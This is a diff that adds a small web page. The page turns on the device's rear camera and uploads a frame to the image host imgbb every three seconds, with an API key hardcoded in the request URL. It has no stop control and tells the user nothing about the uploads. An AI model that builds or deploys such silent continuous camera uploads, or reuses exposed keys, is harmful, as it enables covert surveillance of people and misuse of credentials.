@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Continuous Image Upload</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #262626;
+        color: #fff;
+    }
+    #video {
+        max-width: 100%;
+        border: 2px solid #fff;
+    }
+    #preview {
+        margin-top: 20px;
+        max-width: 300px;
+    }
+</style>
+</head>
+<body>
+<div>
+    <h2>Continuous Image Upload</h2>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="preview"></div>
+</div>
+<script>
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+    .then(function(stream) {
+        var video = document.getElementById('video');
+        video.srcObject = stream;
+        video.play();
+    })
+    .catch(function(err) {
+        console.error('Error accessing the camera: ', err);
+    });
+
+    var canvas = document.getElementById('canvas');
+    var context = canvas.getContext('2d');
+    var img = document.createElement('img');
+
+    function captureAndUpload() {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        var imageData = canvas.toDataURL('image/jpeg');
+        img.src = imageData;
+
+        var formData = new FormData();
+        formData.append('image', dataURItoBlob(imageData));
+
+        fetch('https://api.imgbb.com/1/upload?key=35a3260fbc62e08e2e166da6d9574ddcm', {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);
+            if (data.data) {
+                img.src = data.data.url;
+                document.getElementById('preview').appendChild(img);
+                setTimeout(captureAndUpload, 3000); // Capture and upload every 3 seconds
+            } else {
+                console.log('Failed to upload image. Retrying...');
+                setTimeout(captureAndUpload, 3000); // Retry after 3 seconds
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            setTimeout(captureAndUpload, 3000); // Retry after 3 seconds
+        });
+    }
+
+    function dataURItoBlob(dataURI) {
+        var byteString = atob(dataURI.split(',')[1]);
+        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        var ab = new ArrayBuffer(byteString.length);
+        var ia = new Uint8Array(ab);
+        for (var i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        var blob = new Blob([ab], { type: mimeString });
+        return blob;
+    }
+
+    captureAndUpload(); // Start capturing and uploading images
+</script>
+</body>
+</html>
